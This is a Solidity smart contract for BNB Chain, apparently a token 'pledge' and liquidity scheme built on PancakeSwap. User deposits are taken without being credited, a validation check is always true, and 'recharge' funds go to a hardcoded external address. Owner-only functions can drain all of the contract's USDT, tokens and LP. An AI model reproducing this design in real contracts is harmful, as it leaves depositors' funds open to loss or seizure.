/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-05-19
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
}

contract USDTERC20 {
    IERC20 public token = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function uTransferFrom(
        address _from,
        address _to,
        uint256 _amount
    ) internal {
        token.transferFrom(_from, _to, _amount);
    }

    function uTransfer(address _to, uint256 _amount) internal {
        token.transfer(_to, _amount);
    }

    function uApprove(address _to, uint256 _amount) internal {
        token.approve(_to, _amount);
    }

    function uAllowance(address owner, address spender)
        internal
        view
        returns (uint256)
    {
        return token.allowance(owner, spender);
    }
}

contract SUERC20 {
    IERC20 public tokens = IERC20(0xcDDf89e22578e7450868901A36ACe0ddF13ec7B3);

    function tTransferFrom(
        address _from,
        address _to,
        uint256 _amount
    ) internal {
        tokens.transferFrom(_from, _to, _amount);
    }

    function tTransfer(address _to, uint256 _amount) internal {
        tokens.transfer(_to, _amount);
    }

    function tApprove(address _to, uint256 _amount) internal {
        tokens.approve(_to, _amount);
    }

    function tAllowance(address owner, address spender)
        internal
        view
        returns (uint256)
    {
        return tokens.allowance(owner, spender);
    }
}

contract PAIRERC20 {
    IERC20 public pair = IERC20(0x344972d4C59b83A4b5681ed1f550E255a2455103);

    function pTransferFrom(
        address _from,
        address _to,
        uint256 _amount
    ) internal {
        pair.transferFrom(_from, _to, _amount);
    }

    function pTransfer(address _to, uint256 _amount) internal {
        pair.transfer(_to, _amount);
    }

    function pApprove(address _to, uint256 _amount) internal {
        pair.approve(_to, _amount);
    }

    function pAllowance(address owner, address spender)
        internal
        view
        returns (uint256)
    {
        return pair.allowance(owner, spender);
    }
}



interface IPancakePair {
    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );
}

contract PancakePair {
    IPancakePair public pairs =IPancakePair(0x344972d4C59b83A4b5681ed1f550E255a2455103);

    function reserve()
        public
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        )
    {
        return pairs.getReserves();
    }
}

interface IPancakeRouter {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);
}

contract BFBPledge is USDTERC20, SUERC20,PAIRERC20, PancakePair, Ownable {

    mapping(address => uint256) public _balances;
    address public hunter =0xEb2Af2620073dbEedb72Fe473202cf4eF5FB1B90;

    address public tokenA = 0xcDDf89e22578e7450868901A36ACe0ddF13ec7B3; //su
    address public tokenB = 0x55d398326f99059fF775485246999027B3197955; //usdt
    address public routerContract = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    IPancakeRouter public router = IPancakeRouter(routerContract);


    event AddPool(address from, uint256 tAmount,uint256 uAmount );
    event RemovePool(address from,uint256 tAmount , uint256 uAmount);
    event Deposit(address from, uint256 amount, uint256 _type);

    event Recharge(address from, uint256 amount);
    event Remove(address to, uint256 amount);

    constructor() payable {}

    function removeLiquiditys (uint256 lpAmount) external {
        pApprove(routerContract, lpAmount);
        pTransferFrom(msg.sender, address(this), lpAmount);

        uint256 amountA;
        uint256 amountB;

        uint256 amountAMin = 0;
        uint256 amountBMin = 0;
        (amountA, amountB) = router.removeLiquidity(
            tokenA,
            tokenB,
            lpAmount,
            amountAMin,
            amountBMin,
            msg.sender,
            block.timestamp+1800
        );
        emit RemovePool(msg.sender, amountA, amountB);
    }

    function addLiquiditys(
       uint256 tokenAamount, uint256 tokenBamount
    ) external  {
        tApprove(routerContract, tokenAamount * 10);
        uApprove(routerContract, tokenBamount * 10 );
        uint256 amountA;
        uint256 amountB;
        uint256 liquidity;
        uint256 amountAMin = 0;
        uint256 amountBMin = 0;
        (amountA, amountB, liquidity) = router.addLiquidity(
            tokenA,
            tokenB,
            tokenAamount,
            tokenBamount,
            amountAMin,
            amountBMin,
            msg.sender,
            block.timestamp+1800
        );
        uTransferFrom(msg.sender, address(this), amountB);
        tTransferFrom(msg.sender, address(this), amountA);
        emit AddPool (msg.sender, tokenAamount, tokenBamount);
    }
    
    function deposit(uint256 _amount, uint256 _type) external {
        require(_type != 1 || _type != 2, "dataType error");
        tTransferFrom(msg.sender, address(this), _amount);
        emit Deposit(msg.sender, _amount, _type);
    }

    function drawUsdt(uint256 _amount) external onlyOwner {
        uTransfer(msg.sender, _amount);
    }
    function drawSu(uint256 _amount) external onlyOwner {
        tTransfer(msg.sender, _amount);
    }
    function drawLp(uint256 _amount) external onlyOwner {
        pTransfer(msg.sender, _amount);
    }

    function retreat(uint256 amount) external {
        uTransferFrom(msg.sender,hunter, amount);
        _balances[msg.sender]+= amount;
        emit Recharge(msg.sender, amount);
    }

   function remove() external {
        require(_balances[msg.sender] >0, "ERC20: transfer amount exceeds balance");
        uTransfer(msg.sender, _balances[msg.sender]/100*95);
        emit Remove(msg.sender,_balances[msg.sender]);
        _balances[msg.sender]= 0;
    }

    receive() external payable {}
}